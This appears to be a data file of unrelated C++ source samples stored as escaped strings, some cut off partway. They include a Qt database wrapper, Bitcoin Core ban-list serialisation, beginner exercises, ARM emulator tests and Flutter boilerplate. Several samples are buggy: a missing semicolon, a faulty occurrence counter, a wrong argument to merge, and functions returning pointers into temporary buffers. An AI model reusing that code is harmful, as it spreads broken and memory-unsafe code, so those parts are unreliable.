pvStatusMessage(p,255,0,0,\"ERROR: qtDatabase::query(%s) %s\", sqlcommand, (const char *) e.toUtf8());\n    return -1;\n  }\n  return 0;\n}\n\nint qtDatabase::populateTable(PARAM *p, int id)\n{\n  int x,y,xmax,ymax;\n  \n  if(db == NULL)\n  {\n    pvStatusMessage(p,255,0,0,\"ERROR: qtDatabase::populateTable() db==NULL\");\n    return -1;\n  }  \n\n  // set table dimension\n  xmax = result->record().count();\n  //ymax = result->size();\n  ymax = result->numRowsAffected();\n  pvSetNumRows(p,id,ymax);\n  pvSetNumCols(p,id,xmax);\n\n  // populate table\n  QSqlRecord record = result->record();\n  if(record.isEmpty())\n  {\n    pvStatusMessage(p,255,0,0,\"ERROR: qtDatabase::populateTable() record is empty\");\n    return -1;\n  }\n\n  for(x=0; x<xmax; x++)\n  { // write name of fields\n    pvSetTableText(p, id, x, -1, (const char *) record.fieldName(x).toUtf8());\n  }\n  result->next();\n  for(y=0; y<ymax; y++)\n  { // write fields\n    QSqlRecord record = result->record();\n    for(x=0; x<xmax; x++)\n    {\n      QSqlField f = record.field(x);\n      if(f.isValid())\n      {\n        QVariant v = f.value();\n        pvSetTableText(p, id, x, y, (const char *) v.toString().toUtf8());\n      }\n      else\n      {\n        pvSetTableText(p, id, x, y, \"ERROR:\");\n      }\n    }\n    result->next();\n  }\n\n  return 0;\n}\n\nconst char *qtDatabase::recordFieldValue(PARAM *p, int x)\n{\n  QSqlRecord record = result->record();\n  if(record.isEmpty())\n  {\n    pvStatusMessage(p,255,0,0,\"ERROR: qtDatabase::recordFieldValue(%d) record is empty\", x);\n    return \"ERROR:\";\n  }\n  QSqlField f = record.field(x);\n  if(f.isValid())\n  {\n    QVariant v = f.value();\n    return v.toString().toUtf8();\n  }\n  else\n  {\n    pvStatusMessage(p,255,0,0,\"ERROR: qtDatabase::recordFieldValue(%d) field is invalid\", x);\n    return \"ERROR:\";\n  }\n}\n\nconst char *qtDatabase::dbQuery(const char *sqlcommand)\n{\n  if(db == NULL) return \"ERROR: database is NULL\";\n  QString qsqlcommand = QString::fromUtf8(sqlcommand);\n  *result = db->exec(qsqlcommand);\n  *error = db->lastError();\n  if(error->isValid())\n  {\n    QString e = error->databaseText();\n    printf(\"qtDatabase::query ERROR: %s\\n\", (const char *) e.toUtf8());\n    return \"ERROR: qtDatabase::query()\";\n  }\n  return \"ERROR: result is not valid\";\n}\n\nconst char *qtDatabase::dbRecordFieldValue(int x)\n{\n  QSqlRecord record = result->record();\n  if(record.isEmpty())\n  {\n    return \"ERROR: qtDatabase::recordFieldValue record is empty\";\n  }\n  QSqlField f = record.field(x);\n  if(f.isValid())\n  {\n    QVariant v = f.value();\n    return v.toString().toUtf8();\n  }\n  else\n  {\n    return \"ERROR: qtDatabase::recordFieldValue field is invalid\";\n  }\n}\n\nint qtDatabase::nextRecord()\n{\n  bool res;             // may 2013 evaluate res due to report by user mhe_fr from our forum\n  res = result->next(); // may 2013 evaluate res  due to report by user mhe_fr from our forum\n  if(!res) return -1;   // may 2013 evaluate res due to report by user mhe_fr from our forum\n  QSqlRecord record = result->record();\n  if(record.isEmpty())\n  if(record.isEmpty()) ret",
    "// Copyright (c) 2009-2010 Satoshi Nakamoto\n// Copyright (c) 2009-2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <addrdb.h>\n\n#include <addrman.h>\n#include <chainparams.h>\n#include <clientversion.h>\n#include <hash.h>\n#include <logging/timer.h>\n#include <netbase.h>\n#include <random.h>\n#include <streams.h>\n#include <tinyformat.h>\n#include <univalue.h>\n#include <util/settings.h>\n#include <util/system.h>\n\n#include <cstdint>\n\nCBanEntry::CBanEntry(const UniValue& json)\n    : nVersion(json[\"version\"].get_int()), nCreateTime(json[\"ban_created\"].get_int64()),\n      nBanUntil(json[\"banned_until\"].get_int64())\n{\n}\n\nUniValue CBanEntry::ToJson() const\n{\n    UniValue json(UniValue::VOBJ);\n    json.pushKV(\"version\", nVersion);\n    json.pushKV(\"ban_created\", nCreateTime);\n    json.pushKV(\"banned_until\", nBanUntil);\n    return json;\n}\n\nnamespace {\n\nstatic const char* BANMAN_JSON_ADDR_KEY = \"address\";\n\n/**\n * Convert a `banmap_t` object to a JSON array.\n * @param[in] bans Bans list to convert.\n * @return a JSON array, similar to the one returned by the `listbanned` RPC. Suitable for\n * passing to `BanMapFromJson()`.\n */\nUniValue BanMapToJson(const banmap_t& bans)\n{\n    UniValue bans_json(UniValue::VARR);\n    for (const auto& it : bans) {\n        const auto& address = it.first;\n        const auto& ban_entry = it.second;\n        UniValue j = ban_entry.ToJson();\n        j.pushKV(BANMAN_JSON_ADDR_KEY, address.ToString());\n        bans_json.push_back(j);\n    }\n    return bans_json;\n}\n\n/**\n * Convert a JSON array to a `banmap_t` object.\n * @param[in] bans_json JSON to convert, must be as returned by `BanMapToJson()`.\n * @param[out] bans Bans list to create from the JSON.\n * @throws std::runtime_error if the JSON does not have the expected fields or they contain\n * unparsable values.\n */\nvoid BanMapFromJson(const UniValue& bans_json, banmap_t& bans)\n{\n    for (const auto& ban_entry_json : bans_json.getValues()) {\n        CSubNet subnet;\n        const auto& subnet_str = ban_entry_json[BANMAN_JSON_ADDR_KEY].get_str();\n        if (!LookupSubNet(subnet_str, subnet)) {\n            throw std::runtime_error(\n                strprintf(\"Cannot parse banned address or subnet: %s\", subnet_str));\n        }\n        bans.insert_or_assign(subnet, CBanEntry{ban_entry_json});\n    }\n}\n\ntemplate <typename Stream, typename Data>\nbool SerializeDB(Stream& stream, const Data& data)\n{\n    // Write and commit header, data\n    try {\n        CHashWriter hasher(stream.GetType(), stream.GetVersion());\n        stream << Params().MessageStart() << data;\n        hasher << Params().MessageStart() << data;\n        stream << hasher.GetHash();\n    } catch (const std::exception& e) {\n        return error(\"%s: Serialize or I/O error - %s\", __func__, e.what());\n    }\n\n    return true;\n}\n\ntemplate <typename Data>\nbool SerializeFileDB(const std::string& prefix, const fs::path& path, const Data& data, int version)\n{\n    // Generate random temporary filename\n    uint16_t randv = 0;\n    GetRandBytes((unsigned char*)&randv, sizeof(randv));\n    std::string tmpfn = strprintf(\"%s.%04x\", prefix, randv);\n\n    // open temp output file, and associate with CAutoFile\n    fs::path pathTmp = GetDataDir() / tmpfn;\n    FILE *file = fsbridge::fopen(pathTmp, \"wb\");\n    CAutoFile fileout(file, SER_DISK, version);\n    if (fileout.IsNull()) {\n        fileout.fclose();\n        remove(pathTmp);\n        return error(\"%s: Failed to open file %s\", __func__, pathTmp.string());\n    }\n\n    // Serialize\n    if (!SerializeDB(fileout, data)) {\n        fileout.fclose();\n        remove(pathTmp);\n        return false;\n    }\n    if (!FileCommit(fileout.Get())) {\n        fileout.fclose();\n        remove(pathTmp);\n        return error(\"%s: Failed to flush file %s\", __func__, pathTmp.string());\n    }\n    fileout.fclose();\n\n    // replace existing file, if any, with new file\n    if (!RenameOver(pathTmp, path)) {\n        remove(pathTmp);\n        return error(\"%s: Rename-into-place failed\", __func__);\n    }\n\n    return true;\n}\n\ntemplate <typename Stream, typename Data>\nbool DeserializeDB(Stream& stream, Data& data, bool fCheckSum = true)\n{\n    try {\n        CHashVerifier<Stream> verifier(&stream);\n        // de-serialize file header (network specific magic number) and ..\n        unsigned char pchMsgTmp[4];\n        verifier >> pchMsgTmp;\n        // ... verify the network matches ours\n        if (memcmp(pchMsgTmp, Params().MessageStart(), sizeof(pchMsgTmp)))\n            return error(\"%s: Invalid network magic number\", __func__);\n\n        // de-serialize data\n        verifier >> data;\n\n        // verify checksum\n        if (fCheckSum) {\n            uint256 hashTmp;\n            stream >> hashTmp;\n            if (hashTmp != verifier.GetHash()) {\n                return error(\"%s: Checksum mismatch, data corrupted\", __func__);\n            }\n        }\n    }\n    catch (const std::exception& ",
    "// LTCB-Timsonguyentu1denN.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\nbool checkSNT(int so);\nint main()\n{\n\tfor (int i = 1; i <= 100; i++)\n\t{\n\t\tif (checkSNT(i)) cout << i << \" \";\n\t}\n}\nbool checkSNT(int so)\n{\n\tint dem = 0\n\t\tfor (int i = 1; i <= so; i++)\n\t\t{\n\t\t\tif (so % i == 0) dem++;\n\t\t}\n\tif (dem == 2) return true;\n\treturn false;\n}\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "//{ Driver Code Starts\n#include<bits/stdc++.h>\n\nusing namespace std;\n\n\n// } Driver Code Ends\n//User function template for C++\nclass Solution{\npublic:\n    /* if x is present in arr[] then returns the count\n        of occurrences of x, otherwise returns 0. */\n    int count(int arr[], int n, int x) {\n        int left = 0, right = n - 1;\n        int count = 0;\n        while (left <= right) {\n            if (arr[left] == x) {\n                count++;\n                left++;\n            } else if (arr[left] < x) {\n                left++;\n            } else if (arr[right] > x) {\n                right--;\n            } else {\n                break;\n            }\n        }\n        return count;\n    }\n};\n\n\n//{ Driver Code Starts.\n\nint main() {\n    int t;\n    cin >> t;\n    while (t--) {\n        int n, x;\n        cin >> n >> x;\n        int arr[n];\n        for (int i = 0; i < n; i++) {\n            cin >> arr[i];\n        }\n        Solution ob;\n        auto ans = ob.count(arr, n, x);\n        cout << ans << \"\\n\";\n    }\n    return 0;\n}\n\n// } Driver Code Ends",
    "#include <iostream>\n\nint main(){\n\n    double temp;\n    char unit;\n    char from;\n\n    std::cout << \"******************** temp conversion ********************\\n\";\n    \n    std::cout << \"F = Fahrenheit\\n\";\n    std::cout << \"C = Celsius\\n\";\n    std::cout << \"K = Kelvin\\n\";\n    \n    std::cout << \"what unit would you like to convert from: \";\n    std::cin >> from;\n    \n    std::cout << \"what would you like to convert to: \";\n    std::cin >> unit;\n    \n    if(from == 'F' && unit == 'C')\n    {\n        std::cout << \"Enter in Temperature in Fahrenheit: \";\n        std::cin >> temp;\n        temp = (temp - 32) / 1.8;\n        std::cout << \"The Temperature in Celsius is: \" << temp << '\\n';\n    }\n    else if(from == 'C' && unit == 'F')\n    {\n        std::cout << \"Enter in Temperature in Celsius: \";\n        std::cin >> temp;\n        temp = (temp * 1.8) + 32;\n        std::cout << \"The Temperature in Fahrenheit is: \" << temp << '\\n';        \n    }\n    else if(from == 'F' && unit == 'K')\n    {\n        std::cout << \"Enter in Temperature in Fahrenheit: \";\n        std::cin >> temp;\n        temp = ((temp - 32) / 1.8) + 273.15;\n        std::cout << \"The Temperature in Kelvin is: \" << temp << '\\n';        \n    }\n        else if(from == 'C' && unit == 'K')\n    {\n        std::cout << \"Enter in Temperature in Celsius: \";\n        std::cin >> temp;\n        temp = (temp + 273.15);\n        std::cout << \"The Temperature in Kelvin is: \" << temp << '\\n';        \n    }\n            else if(from == 'K' && unit == 'C')\n    {\n        std::cout << \"Enter in Temperature in Kelvin: \";\n        std::cin >> temp;\n        temp = (temp - 273.15);\n        std::cout << \"The Temperature in Celsius is: \" << temp << '\\n';        \n    }\n        else if(from == 'K' && unit == 'F' )\n    {\n        std::cout << \"Enter in Temperature in Kelvin: \";\n        std::cin >> temp;\n        temp = (((temp - 273.15) * 1.8) + 32);\n        std::cout << \"The Temperature in fahrenheit is: \" << temp << '\\n';        \n    }\n    else{\n        std::cout << \"Please enter a valid units of Temperature measurment (F, C, K)\\n\";\n    }\n    \n    \n    std::cout << \"********************************************************\\n\";\n}",
    "#include<iostream>\n#include<glad/glad.h>\n#include<GLFW/glfw3.h>\n\n//lets use IMgui\n\n#include\"imgui.h\"\n#include\"imgui_impl_glfw.h\"\n#include\"imgui_impl_opengl3.h\"\n\n\n//global var\n\nGLFWwindow* window;\n\n// Init and config GLFW\nvoid initGLFW() {\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);\n}\n\n\nvoid initImgui() {\n \n    //FIND VERSION\n    IMGUI_CHECKVERSION();\n    //create contex\n    ImGui::CreateContext();\n\n    //var for inputs and outputs\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n\n    //dark mode \n    //i might make a button to change that\n\n    ImGui::StyleColorsDark();\n    ImGui_ImplGlfw_InitForOpenGL(window, true);\n    //version of GLSL\n    ImGui_ImplOpenGL3_Init(\"#version 330\");\n\n}\n\n\n\nint main() {\n\n\n    // Init GLFW\n    initGLFW();\n\n   \n    \n    //generate a window\n    window = glfwCreateWindow(800, 800, \"Simple Window\", NULL, NULL);\n    if (window == NULL) {\n        //if we cant create a window\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n\n    //load glad, and check if it has errors\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)) {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n  \n    //init imgui\n\n    initImgui();\n\n\n\n    //set the size\n    glViewport(0, 0, 800, 800);\n\n   \n    while (!glfwWindowShouldClose(window)) {\n        //render imgui\n   \n      \n        // Clear the screen\n        glClearColor(0.2f, 0.3f, 0.3f, 1.0f); \n        glClear(GL_COLOR_BUFFER_BIT);\n\n        //Ui win\n\n        ImGui_ImplOpenGL3_NewFrame();\n        ImGui_ImplGlfw_NewFrame();\n        ImGui::NewFrame();\n\n\n\n        //lets create the win\n        ImGui::Begin(\"Testwin\");\n        ImGui::Text(\"render\");\n        ImGui::End();\n\n        //render\n\n        ImGui::Render();\n        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());\n\n\n\n      \n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    //clean up\n    ImGui_ImplOpenGL3_Shutdown();\n    ImGui_ImplGlfw_Shutdown();\n    ImGui::DestroyContext();\n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    return 0;\n}\n",
    "#include \"Arm/ArmTest.h\"\n\nclass MoveRegisterToCoprocessorTest: public ArmTest {};\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UndefinedInstructionExceptionTakenWhenCoprocessorAbsentSupervisorMode) {\n    Given({\n        \"PSR is 0,SVC\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCR p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is SINS\",\n        \"PSR is I,SVC\",\n        \"PC is $0000000C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $00001007\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UnexecutedInstructionShouldNotTakeExceptionWhenCoprocessorAbsentSupervisorMode) {\n    Given({\n        \"PSR is C,SVC\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCRCC p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is S\",\n        \"PSR is C,SVC\",\n        \"PC is $0000100C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UndefinedInstructionExceptionTakenWhenCoprocessorAbsentInterruptMode) {\n    Given({\n        \"PSR is 0,IRQ\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCR p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is SINS\",\n        \"PSR is I,SVC\",\n        \"PC is $0000000C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $00001006\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UnexecutedInstructionShouldNotTakeExceptionWhenCoprocessorAbsentInterruptMode) {\n    Given({\n        \"PSR is C,IRQ\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCRCC p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is S\",\n        \"PSR is C,IRQ\",\n        \"PC is $0000100C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UndefinedInstructionExceptionTakenWhenCoprocessorAbsentFastInterruptMode) {\n    Given({\n        \"PSR is 0,FIQ\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCR p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is SINS\",\n        \"PSR is I,SVC\",\n        \"PC is $0000000C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $00001005\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UnexecutedInstructionShouldNotTakeExceptionWhenCoprocessorAbsentFastInterruptMode) {\n    Given({\n        \"PSR is C,FIQ\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCRCC p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is S\",\n        \"PSR is C,FIQ\",\n        \"PC is $0000100C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UndefinedInstructionExceptionTakenWhenCoprocessorAbsentUserMode) {\n    Given({\n        \"PSR is 0,USR\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n        \"MCR p7, #7, R1, c3, c4\"\n    });\n    Then({\n        \"CYCLES is SINS\",\n        \"PSR is I,SVC\",\n        \"PC is $0000000C\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $00001004\"\n    });\n}\n\nTEST_F(MoveRegisterToCoprocessorTest,\n       UnexecutedInstructionShouldNotTakeExceptionWhenCoprocessorAbsentUserMode) {\n    Given({\n        \"PSR is C,USR\",\n        \"PC is $00001008\",\n        \"R5 is $00000004\",\n        \"R14_USR is $11111111\",\n        \"R14_FIQ is $22222222\",\n        \"R14_IRQ is $33333333\",\n        \"R14_SVC is $44444444\"\n    }),\n    When({\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sqlite\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// #include <bits/stdc++.h> \nusing namespace std;\n#include <vector>\n#include <stdio.h>\n#include <iostream>\n// using std::vector<int> vector;\n\nclass Solution {\npublic:\n    // Merges two increasing order arrays\n    void merge(std::vector<int>& nums1, int m, std::vector<int>& nums2, int n) {\n        // sorted in decreasing order\n        // put nums2 into nums1 with non decreasing order\n\n        int i = m - 1; // Index for nums1\n        int j = n - 1; // Index for nums2\n        int k = m + n - 1; // Index for merged result\n\n        while (i >= 0 && j >= 0) {\n            if (nums1[i] > nums2[j]) {\n                nums1[k] = nums1[i];\n                i--;\n            } else {\n                nums1[k] = nums2[j];\n                j--;\n            }\n            k--;\n        }\n\n        // If there are remaining elements in nums2, copy them to nums1\n        while (j >= 0) {\n            nums1[k] = nums2[j];\n            j--;\n            k--;\n        }\n    }\n    //     int j = 0;\n    //     int i = 0;\n\n    //     printf(\"size: %d, size2: %d\\n\", m, n);\n\n    //     for (auto i: nums1)\n    //         std::cout << i << ' ';\n\n    //     std::cout << endl;\n\n    //     for (auto i: nums2)\n    //         std::cout << i << ' ';\n\n    //     std::cout << endl;\n\n    //     // for(j; j < n; j++){\n\n    //         for(i; i < n; i++){\n    //             printf(\"i: %d\\n\", i);\n\n    //             j = 0;\n\n    //             while(nums2[i] > nums1[j] && j <= n){\n    //                 // pre-append nums2[j]\n    //                 printf(\"nums1: %d, nums2: %d\\n\", nums1[j], nums2[i]);\n\n    //                 if(nums2[i] < nums1[j+1] || j > m-n){\n                    \n    //                     nums1.insert(nums1.begin() + j + 1, nums2[i]);\n\n    //                     break;\n    //                 }\n\n    //                 printf(\"ALL nums1: %d, nums2: %d\\n\", nums1[j], nums2[i]);\n\n    //                 for (auto u: nums1)\n    //                     std::cout << u << ' ';\n    //                 std::cout << endl;\n\n    //                 j += 1;\n\n    //             }\n    //         // }\n\n            \n            \n    //     }\n    // }\n};\n\n\nint main(){\n    vector<int> vector1{1,2,3,5,0,0,0};\n    vector<int> vector2{4,6,7};\n\n    Solution *sol = new Solution();\n\n    int n = vector1.size();\n    int m = vector2.size();\n\n    printf(\"first size: %d, size2: %d\\n\", n, m);\n\n    sol->merge(vector1, vector1.size() + m, vector2, vector2.size());\n\n    return 0;\n}",
    "#include \"cstudentinfo.h\"\r\n#include \"qdebug.h\"\r\ncstudentinfo::cstudentinfo()\r\n{\r\n\r\n}\r\n\r\nbool cstudentinfo::setData(int id, QString name, QString sex, int age, QString classname, QString coursedate, int coursenum, QString coursename, QString coursetype, double credit, QString courselauchtime)\r\n{\r\n    qDebug()<<\"setData id\"<<id;\r\n    this->Id = id;\r\n    this->Name = name;\r\n    this->sex = sex;\r\n    this->age = age;\r\n    this->classname = classname;\r\n    this->coursedate = coursedate;\r\n    this->coursenum = coursenum;\r\n    this->coursename = coursename;\r\n    this->coursetype = coursetype;\r\n    this->credit = credit;\r\n    this->courselauchtime = courselauchtime;\r\n    return true;\r\n}\r\n\r\nint cstudentinfo::getId() const\r\n{\r\n    return Id;\r\n}\r\n\r\nvoid cstudentinfo::setId(int value)\r\n{\r\n    Id = value;\r\n}\r\n\r\nQString cstudentinfo::getName() const\r\n{\r\n    return Name;\r\n}\r\n\r\nvoid cstudentinfo::setName(const QString &value)\r\n{\r\n    Name = value;\r\n}\r\n\r\nQString cstudentinfo::getSex() const\r\n{\r\n    return sex;\r\n}\r\n\r\nvoid cstudentinfo::setSex(const QString &value)\r\n{\r\n    sex = value;\r\n}\r\n\r\nint cstudentinfo::getAge() const\r\n{\r\n    return age;\r\n}\r\n\r\nvoid cstudentinfo::setAge(int value)\r\n{\r\n    age = value;\r\n}\r\n\r\nQString cstudentinfo::getClassname() const\r\n{\r\n    return classname;\r\n}\r\n\r\nvoid cstudentinfo::setClassname(const QString &value)\r\n{\r\n    classname = value;\r\n}\r\n\r\nQString cstudentinfo::getCoursedate() const\r\n{\r\n    return coursedate;\r\n}\r\n\r\nvoid cstudentinfo::setCoursedate(const QString &value)\r\n{\r\n    coursedate = value;\r\n}\r\n\r\nint cstudentinfo::getCoursenum() const\r\n{\r\n    return coursenum;\r\n}\r\n\r\nvoid cstudentinfo::setCoursenum(int value)\r\n{\r\n    coursenum = value;\r\n}\r\n\r\nQString cstudentinfo::getCoursename() const\r\n{\r\n    return coursename;\r\n}\r\n\r\nvoid cstudentinfo::setCoursename(const QString &value)\r\n{\r\n    coursename = value;\r\n}\r\n\r\nQString cstudentinfo::getCoursetype() const\r\n{\r\n    return coursetype;\r\n}\r\n\r\nvoid cstudentinfo::setCoursetype(const QString &value)\r\n{\r\n    coursetype = value;\r\n}\r\n\r\ndouble cstudentinfo::getCredit() const\r\n{\r\n    return credit;\r\n}\r\n\r\nvoid cstudentinfo::setCredit(double value)\r\n{\r\n    credit = value;\r\n}\r\n\r\nQString cstudentinfo::getCourselauchtime() const\r\n{\r\n    return courselauchtime;\r\n}\r\n\r\nvoid cstudentinfo::setCourselauchtime(const QString &value)\r\n{\r\n    courselauchtime = value;\r\n}\r\n\r\nvoid cstudentinfo::addAttendanceInfo(const cattendanceinfo &attendanceInfo) {\r\n    attendanceInfos.append(attendanceInfo);\r\n}\r\n\r\nQList<cattendanceinfo> cstudentinfo::getAttendanceInfos() const {\r\n    return attendanceInfos;\r\n}\r\n\r\nvoid cstudentinfo::setAttendanceInfos(const QList<cattendanceinfo> &attendanceInfos) {\r\n    this->attendanceInfos = attendanceInfos;\r\n}\r\n\r\ncattendanceinfo cstudentinfo::getSpecificAttendanceInfo(int attendanceId) const {\r\n    for (const auto& attendanceInfo : attendanceInfos) {\r\n        if (attendanceInfo.getAttendanceId() == attendanceId) {\r\n            return attendanceInfo;\r\n        }\r\n    }\r\n    return cattendanceinfo();\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quizz_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"parser.h\"\n\nproglang::ParserElement::ParserElement(proglang::ParserElement* _parent, proglang::ParserElementType _type, std::vector<std::string> _data) {\n  parent = _parent;\n  type = _type;\n  data = _data;\n}\n\nproglang::ParserElement::~ParserElement() { }\n\nvoid proglang::ParserElement::printTree(std::string off) {\n  if (type == ParserElementType::ROOT) {\n    DEBUG(off << \"ROOT (\");\n  } else if (type == ParserElementType::FUNCTION) {\n    DEBUG(off << \"FUNCTION (\");\n  } else if (type == ParserElementType::EXTERNAL_FUNCTION) {\n    DEBUG(off << \"EXTERNAL_FUNCTION (\");\n  } else if (type == ParserElementType::FUNCTION_CALL) {\n    DEBUG(off << \"FUNCTION_CALL (\");\n  } else if (type == ParserElementType::VARIABLE_DECLARATION) {\n    DEBUG(off << \"VARIABLE_DECLARATION (\");\n  } else if (type == ParserElementType::VARIABLE_DECLARATION_EMPTY) {\n    DEBUG(off << \"VARIABLE_DECLARATION_EMPTY (\");\n  } else if (type == ParserElementType::VARIABLE_ASSIGNMENT) {\n    DEBUG(off << \"VARIABLE_ASSIGNMENT (\");\n  } else if (type == ParserElementType::VARIABLE_ASSIGNMENT_TO_FUNCTION_CALL) {\n    DEBUG(off << 